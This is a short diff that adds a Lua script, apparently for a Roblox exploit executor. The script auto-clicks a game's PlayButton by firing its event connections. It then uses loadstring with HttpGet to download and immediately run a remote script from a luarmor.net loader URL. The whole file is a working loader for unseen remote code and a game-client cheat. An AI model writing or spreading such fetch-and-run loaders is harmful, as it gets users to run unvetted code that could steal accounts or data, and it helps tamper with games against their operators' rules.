@@ -1,0 +1,18 @@
+pcall(function()
+    function button_click (button_obj)
+        local events = {"MouseButton1Down", "MouseButton1Click", "Activated"}
+        
+        for i,v in pairs(events) do
+            for _,connection in pairs(getconnections(button_obj[v])) do
+                pcall(function ()
+                    connection:Fire()
+                end)
+            end
+        end
+    end
+    repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.Visible == true
+    print('play button click✅')
+    local Button = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton
+    button_click(Button)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5386bfa9bb03ae1da997e3078394366.lua"))()
+end)
